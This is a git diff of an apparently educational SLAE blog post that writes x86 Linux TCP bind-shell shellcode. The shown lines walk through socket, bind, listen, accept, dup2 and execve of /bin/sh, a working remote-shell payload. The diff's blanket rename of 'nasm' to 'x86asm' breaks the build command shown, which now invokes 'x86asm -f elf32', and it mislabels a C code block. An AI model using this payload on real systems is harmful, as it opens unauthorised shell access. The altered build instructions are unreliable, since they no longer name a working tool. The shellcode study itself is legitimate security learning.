@@ -2,6 +2,8 @@
 title: SLAE Tcp Bind Shell
 date: 2017-03-21
 draft: false
+tags: [32bit,linux,assembly,shellcode,slae]
+langs: [c,x86asm]
 ---
 # SLAE
 The SecurityTube Linux Assembly Expert is a course and certification from the
@@ -178,17 +180,17 @@ Lets also refresh ourselves on the desired characteristics of our shellcode
 First thing we going to need to do is zero out our registers so we have a clean
 slate
 
-{{< highlight nasm >}}
+```x86asm
         xor eax, eax            ; Zero out registers
         xor ebx, ebx
         xor ecx, ecx
         xor edx, edx
-{{< / highlight >}}
+```
 
 With that out the way lets now take a look at the socket syscall docs (link
 above)
 
-```
+```c
   sockfd = socket(int socket_family, int socket_type, int protocol);
 ```
 Right so the registers need to be as follows
@@ -200,12 +202,12 @@ Right so the registers need to be as follows
 If all goes well we should get a file descriptor to a sock back in EAX. Heres
 the code
 
-{{< highlight nasm >}}
+```x86asm
         mov bl, 0x2             ; AF_INET
         inc cl                  ; SOCK_STREAM = 1 - Leave EDX 0 for IP
         mov ax, 0x0167          ; Socket syscall number
         int 0x80                ; make call
-{{< / highlight >}}
+```
 
 Notice how we used the 8 bit versions of EBX and ECX to avoid NULLs and also how
 we used "inc cl" to save a byte as apposed to a mov instruction. We used the 16
@@ -217,7 +219,7 @@ and we cant spare the bytes for error checking) which means that there should be
 a socket file descriptor sat in EAX waitning for us, the problem is we need EAX
 for our next syscall so we shall have to save it somewhere! Lets use EDI
 
-{{< highlight nasm >}}
+{{< highlight x86asm >}}
         xchg edi, eax           ; store socketfd
 {{< / highlight >}}
 
@@ -228,7 +230,7 @@ Now that is out of the way we need to set up the bind syscall, we have the
 syscall number and the address familly constants all worked out for this but we
 now need to figure out how the sockaddr_in structure looks on the stack. First
 let us remind our selves how sockaddr_in looks in C
-```
+```x86asm
   struct sockaddr_in {  
     short sin_family;  
     unsigned short sin_port;  
@@ -263,7 +265,7 @@ bytes for the padding which adds up to 16 bytes or 0x10
 
 So lets get this all set up
 
-{{< highlight nasm >}}
+{{< highlight x86asm >}}
         ; Now call bind
         push edx                ; INADDR_ANY - IP to bind to in soccaddr_in
         push word 0x8813        ; Port in Network byte order
@@ -291,7 +293,7 @@ sensible value as it currently a pointer to a sockaddr_in struct. We achieve
 this by xchg ing ECX and EDX as EDX has the value 16 which is an acceptable
 value for the backlog parameter.
 
-{{< highlight nasm >}}
+{{< highlight x86asm >}}
         ; Call listen
         xchg ecx, edx           ; set up the backlog parameter
         mov ax, 0x016B          ; set syscall number for listen
@@ -408,7 +410,7 @@ server socket fd. I chose to use EDI instead however on second thoughts the
 program this shellcode may be instered into may have already set ESI so its best
 to xor it lets look at the code for the accept call
 
-{{< highlight nasm >}}
+{{< highlight x86asm >}}
         xor ecx, ecx            ; zero out registers
         xor esi, esi
         mov ax, 0x016c          ; set accept syscall
@@ -436,7 +438,7 @@ calls.
 These three calls will redirect our STDIN, STDOUT and STDERR to the client
 socket. Here is the code
 
-{{< highlight nasm >}}
+{{< highlight x86asm >}}
         mov cl, 0x2
 loop:
         mov al, 0x3f            ; setup dup2 call
@@ -465,7 +467,7 @@ extra /
 
 Here is the code 
 
-{{< highlight nasm >}}
+{{< highlight x86asm >}}
         push eax                ; push NULL onto stack to termins //bin/sh
         push 0x68732f6e         ; push //bin/sh in reverse onto the stack
         push 0x69622f2f         ; see above
@@ -484,7 +486,7 @@ Here is the code
 
 Right all done! Below is the code in all its glory!!
 
-{{< highlight nasm >}}
+{{< highlight x86asm >}}
 global _start
 section .text
 
@@ -550,7 +552,7 @@ loop:
 
 Lets compile, link and run it
 ```
- $ nasm -f elf32 -o bind.o bind_shell.nasm
+ $ x86asm -f elf32 -o bind.o bind_shell.x86asm
  $ ld -m elf_i386 -o bind bind.o
  $ ./bind
 
@@ -563,7 +565,7 @@ bind
 bind.o
 bind_shell
 bind_shell.c
-bind_shell.nasm
+bind_shell.x86asm
 
 ```
 Woop woop, party time!! Well not quite we wanted shellcode not and assembly
@@ -672,7 +674,7 @@ bind
 bind.o
 bind_shell
 bind_shell.c
-bind_shell.nasm
+bind_shell.x86asm
 shell_test.c
 shell_test
 
